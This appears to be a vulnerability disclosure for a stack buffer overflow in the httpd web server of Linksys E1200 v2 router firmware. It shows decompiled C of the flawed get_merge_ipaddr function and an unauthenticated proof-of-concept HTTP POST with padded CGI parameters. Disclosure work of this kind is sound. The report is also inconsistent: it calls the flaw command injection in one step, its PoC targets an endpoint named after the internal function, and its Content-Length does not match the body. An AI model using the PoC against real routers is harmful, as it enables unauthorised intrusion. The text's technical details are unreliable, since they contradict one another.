# Buffer Overflow Vulnerability in `get_merge_ipaddr`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys E1200 v2 Router                                      |
| Firmware Version     | **E1200_v2.0.11.001_us.tar.gz**                              |
| Vulnerability Type   | **Stack-Based Buffer Overflow**                              |
| Vulnerable Component | `httpd` (function `get_merge_ipaddr`, buffer `a2`)           |
| Prerequisites        | No authentication required; remote exploitation possible via CGI parameters matching `<parameter>_0~3` |

2. Exploitation Path

```c
int __fastcall get_merge_ipaddr(const char *a1, char *a2)
{
  int i; // $s0
  const char *cgi; // $v0
  char v7[32]; // [sp+20h] [-20h] BYREF

  *a2 = 0;
  for ( i = 0; i != 4; ++i )
  {
    snprintf(v7, 0x1Eu, "%s_%d", a1, i);
    cgi = (const char *)get_cgi((int)v7);
    if ( !cgi )
      cgi = "0";
    strcat(a2, cgi);
    if ( i == 3 )
      break;
    strcat(a2, ".");
  }
  return 1;
}
```

3. **Vulnerable Binaries:** `httpd`.
4. 0-Day Command Injection Exploitation Path: In the `httpd` file, at line 11, `cgi = (const char *)get_cgi((int)v7)` receives data via `get_cgi` without any length restriction. A loop of 4 iterations performs string concatenation at line 14 with `strcat(a2, cgi)`. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/get_merge_ipaddr HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

param_0=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&param_1=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB&param_2=CCCCCCCCCCCCCCCCCCCCCCCCCCCCC&param_3=DDDDDDDDDDDDDDDDDDDDDDDDDDDD
```